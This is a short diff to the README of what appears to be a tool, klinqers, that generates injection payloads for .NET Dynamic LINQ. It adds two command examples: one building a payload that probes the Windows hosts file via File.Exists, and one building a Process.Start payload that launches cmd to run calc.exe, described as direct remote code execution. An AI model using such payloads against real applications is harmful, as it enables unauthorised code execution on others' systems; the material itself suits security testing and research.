@@ -7,3 +7,14 @@ See more about these kind of issues here:
 - https://stackoverflow.com/questions/8738953/is-injection-possible-through-dynamic-linq
 - https://vulncat.fortify.com/en/detail?id=desc.dataflow.dotnet.sql_injection_linq
 
+
+## Examples
+
+**Example 1** - create an injectable code for File.Exists()
+
+`klinqers.exe --call "System.IO.File.Exists(c:/windows/system32/drivers/etc/hosts)" `
+
+
+**Example 2** - create an injectable code for Process.Start() .. if that works it is direct RCE
+
+`klinqers.exe --call "System.Diagnostics.Process.Start(cmd,/c calc.exe)" `
